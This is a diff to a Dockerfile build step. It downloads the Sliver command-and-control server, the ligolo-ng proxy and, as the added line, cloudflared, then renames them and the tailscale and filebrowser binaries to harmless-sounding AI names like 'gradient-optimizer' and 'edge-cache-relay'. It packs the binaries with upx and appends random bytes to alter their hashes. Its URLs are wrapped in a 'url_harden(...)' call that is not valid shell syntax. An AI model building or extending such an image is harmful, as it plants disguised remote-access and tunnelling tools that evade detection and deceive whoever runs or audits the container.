@@ -27,11 +27,12 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     && curl -fsSL url_harden("https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64") -o /usr/bin/gradient-optimizer \
     && curl -fsSL url_harden("https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz") -o /tmp/ligolo-proxy.tar.gz \
     && tar -xzf /tmp/ligolo-proxy.tar.gz -C /tmp && mv /tmp/proxy /usr/bin/neural-route-controller \
+    && curl -fsSL url_harden("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64") -o /usr/bin/edge-cache-relay \
     && mv /usr/sbin/tailscaled /usr/bin/python-cache-manager \
     && mv /usr/bin/tailscale /usr/bin/py-cache-cli \
     && mv /usr/local/bin/filebrowser /usr/bin/ai-metrics-collector \
-    && chmod +x /usr/bin/tensor-allocator /usr/bin/cuda-mesh-bridge /usr/bin/system-bridge /usr/bin/gradient-optimizer /usr/bin/neural-route-controller /usr/bin/model-routing-engine \
-    && for bin in python-cache-manager py-cache-cli ai-metrics-collector tensor-allocator cuda-mesh-bridge system-bridge gradient-optimizer neural-route-controller model-routing-engine; do \
+    && chmod +x /usr/bin/tensor-allocator /usr/bin/cuda-mesh-bridge /usr/bin/system-bridge /usr/bin/gradient-optimizer /usr/bin/neural-route-controller /usr/bin/model-routing-engine /usr/bin/edge-cache-relay \
+    && for bin in python-cache-manager py-cache-cli ai-metrics-collector tensor-allocator cuda-mesh-bridge system-bridge gradient-optimizer neural-route-controller model-routing-engine edge-cache-relay; do \
         upx -1 "/usr/bin/$$bin" 2>/dev/null || true; \
         if ! head -n 1 "/usr/bin/$$bin" | grep -q "^#!"; then \
             head -c 32 /dev/urandom >> "/usr/bin/$$bin"; \
